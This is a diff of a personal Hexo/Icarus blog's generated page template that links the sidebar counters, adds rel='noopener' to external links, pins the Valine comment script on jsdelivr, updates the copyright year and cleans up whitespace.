+                        </ul>
+                
+                <!-- 文章结尾添加版权声明 到这里结束 -->
         
         <div class="level is-size-7 is-uppercase">
             <div class="level-start">
@@ -316,7 +323,7 @@
         
 <div id="valine-thread" class="content"></div>
 <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>
 <script>
     new Valine({
         el: '#valine-thread' ,
@@ -369,9 +376,11 @@
                     <p class="heading">
                         文章
                     </p>
-                    <p class="title has-text-weight-normal">
-                        25
-                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            25
+                        </p>
+                    </a>
                 </div>
             </div>
             <div class="level-item has-text-centered is-marginless">
@@ -379,9 +388,11 @@
                     <p class="heading">
                         分类
                     </p>
-                    <p class="title has-text-weight-normal">
-                        5
-                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            5
+                        </p>
+                    </a>
                 </div>
             </div>
             <div class="level-item has-text-centered is-marginless">
@@ -389,15 +400,17 @@
                     <p class="heading">
                         标签
                     </p>
-                    <p class="title has-text-weight-normal">
-                        32
-                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            32
+                        </p>
+                    </a>
                 </div>
             </div>
         </nav>
         
         <div class="level">
-            <a class="level-item button is-link is-rounded" href="https://twitter.com/jon_tsang_" target="_blank">
+            <a class="level-item button is-link is-rounded" href="https://twitter.com/jon_tsang_" target="_blank" rel="noopener">
                 关注我</a>
         </div>
         
@@ -405,28 +418,28 @@
         
         <div class="level is-mobile">
             
-            <a class="level-item button is-white is-marginless" target="_blank"
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                 title="Github" href="https://github.com/JonTsang">
                 
                 <i class="fab fa-github"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                 title="Twitter" href="https://twitter.com/jon_tsang_">
                 
                 <i class="fab fa-twitter"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                 title="Instagram" href="https://www.instagram.com/jontsang_/">
                 
                 <i class="fab fa-instagram"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                 title="RSS" href="/">
                 
                 <i class="fas fa-rss"></i>
@@ -497,9 +510,9 @@
                 
                 </a>
                 <p class="is-size-7">
-                &copy; 2019 Jon Tsang&nbsp;
-                <!--Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
-                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>-->
+                &copy; 2020 Jon Tsang&nbsp;
+                <!--Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>-->
                 
                 <br>
                 <span id="busuanzi_container_site_uv">
@@ -513,7 +526,7 @@
                 <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
                 
                 <p class="control">
-                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
                         
                         <i class="fab fa-creative-commons"></i>
                         
@@ -521,7 +534,7 @@
                 </p>
                 
                 <p class="control">
-                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
                         
                         <i class="fab fa-creative-commons-by"></i>
                         
@@ -529,7 +542,7 @@
                 </p>
                 
                 <p class="control">
-                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/JonTsang">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/JonTsang">
                         
                         <i class="fab fa-github"></i>
                         
@@ -546,8 +559,13 @@
 <script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
 <script>moment.locale("zh-CN");</script>
 
+
 <script>
 var IcarusThemeSettings = {
+    site: {
+        url: 'https://jontsang.github.io',
+        external_link: {"enable":true,"exclude":[]}
+    },
     article: {
         highlight: {
             clipboard: true,
@@ -558,25 +576,25 @@ var IcarusThemeSettings = {
 </script>
 
 
-    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
 
 
 
-    
-    
+
+
 <script src="/js/animation.js"></script>
 
-    
-    
+
+
 <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
 <script src="/js/gallery.js" defer></script>
 
-    
-    
+
+
 <div id="outdated">
     <h6>Your browser is out-of-date!</h6>
-    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
             my browser now </a></p>
     <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
@@ -591,8 +609,8 @@ var IcarusThemeSettings = {
     });
 </script>
 
-    
-    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
 <script>
 document.addEventListener('DOMContentLoaded', function () {
     MathJax.Hub.Config({
@@ -614,24 +632,24 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 });
 </script>
-    
-    
-<a id="back-to-top" title="回到顶端" href="javascript:;" target="_blank" rel="noopener">
+
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
 
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
+
+
+
+
+
+
+
+
+
+
+
 
 
 <script src="/js/main.js" defer></script>
